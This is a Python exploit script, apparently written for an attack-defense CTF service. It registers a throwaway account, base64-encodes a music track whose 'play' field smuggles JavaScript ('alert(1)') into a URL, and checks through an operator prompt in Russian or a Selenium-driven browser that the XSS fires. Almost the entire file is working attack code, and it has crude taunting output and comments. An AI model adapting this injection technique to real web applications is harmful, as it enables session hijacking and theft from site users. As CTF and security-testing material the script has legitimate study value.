#!/usr/bin/env python3
import base64
import hashlib
import json
import logging
import random
import requests
import string
import traceback
from http.client import HTTPConnection
from requests.exceptions import Timeout
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
try:
    from selenium import webdriver # type: ignore
    from selenium.common import exceptions # type: ignore
    from selenium.webdriver.support import expected_conditions # type: ignore
    from selenium.webdriver.support.ui import WebDriverWait # type: ignore
    from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
except ImportError:
    print("Selenium not imported. If you run with --selenium, you need to install it with `pip3 install selenium` or `zypper install python3-selenium`")

from typing import List


log = logging.getLogger("requests.packages.urllib3")

TB_AUTH_HEADER = 'XTBAuth'

class AttackError(Exception):
    pass
class ConnectionError(Exception):
    pass

def rand_string(length: int = 16) -> str:
    letters = string.ascii_letters + string.digits
    name = "".join(random.choice(letters) for _ in range(length))
    return name

def get_sha256(s):
    return hashlib.sha256(s.encode('utf-8')).hexdigest()

def get_session_with_retry(
        retries=3,
        backoff_factor=0.3,
        status_forcelist=(400, 404, 500, 502),
) -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)

    return session


def attack(hostname: str, port: int, use_selenium: bool = False) -> List[str]:
    try:
        # register

        nickname = 'user-' + rand_string()
        password = rand_string()
        password_sha256 = get_sha256(password)
        payment = "0000 0000 0000 0000"

        session = get_session_with_retry()

        log.debug(f'creating user {nickname} with password {password} ({password_sha256})')

        response = session.post(
            f"http://{hostname}:{port}/api/users",
            json={
                "nickname": nickname,
                "password_sha256": password_sha256,
                "payment_info": payment
            },
        )

        log.debug(f'response: \ncode: {response.status_code}\nheaders:{response.headers}\ntext:{response.text}')

        if response.status_code != 200:
            raise ConnectionError(f'unexpected code when registering: {response.status_code}')

        response_json = response.json()
        auth_token = response_json['auth_token']
        log.debug(f'user created with auth_token {response.json()}')

        if response.headers[TB_AUTH_HEADER] != auth_token:
            raise ConnectionError("Incorrect auth token set")

        # create xss track

        track = json.dumps({
            'notes': ''.join(
                [random.choice(["C", "C#", "D", "D#", "E", "F", "F#", "G", "G#", "A", "A#", "B"]) for _ in range(20)]),
            'waveform': random.choice(["sine", "square", "sawtooth", "triangle"]),
            # This works because the JSON-decoding for 'class Notes' also decodes this field for some reason. And we can put any JS code here.
            'play': "alert(1)",
        })
        track = base64.b64encode(track.encode('utf-8')).decode('utf-8')
        title = rand_string(15)
        description = rand_string(15)

        vector_json = "&".join(f"{k}={v}" for k, v in {
            "track": track,
            "title": title,
            "description": description,
        }.items())
        vector = base64.b64encode(vector_json.encode()).decode()
        vector_url = "http://" + hostname + ":6001/#/track?" + vector

        if not use_selenium:
            print(f"Пройдите на '{vector_url}' и нажмите play")
            while True:
                r = input("Видено окно с сообщением? [Y/n/Д/н]")
                if r in "yYдД":
                    print("you have been PWNed!")
                    return ["hahaha"]
                elif r in "nNнН":
                    raise AttackError("I believe you")
        else:
            try:
                url = "http://localhost:6001/#/track?" + vector
                print(f"getting {url}\nIf this takes too long, stop with ctrl-c")
                driver = webdriver.Remote(command_executor="http://localhost:4444/wd/hub",
                desired_capabilities=DesiredCapabilities.FIREFOX)
                driver.get(url)
                driver.find_element_by_xpath("//button[text()='play']").click()
                try:
                    WebDriverWait(driver, 3).until(expected_conditions.alert_is_present())
                    driver.switch_to.alert.accept()
                    print("success!")
                except exceptions.TimeoutException:
                    raise AttackError("No XSS")
                except Exception as e:
                    print(f"Selenium sucks dicks: {e}")
            finally:
                driver.close()

        return []

    except AttackError:
        raise
    except Exception as e:
        traceback.print_exc()
        raise AttackError("Checker error?")

if __name__ == "__main__":
    import sys
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 6001
    attack(host, port)
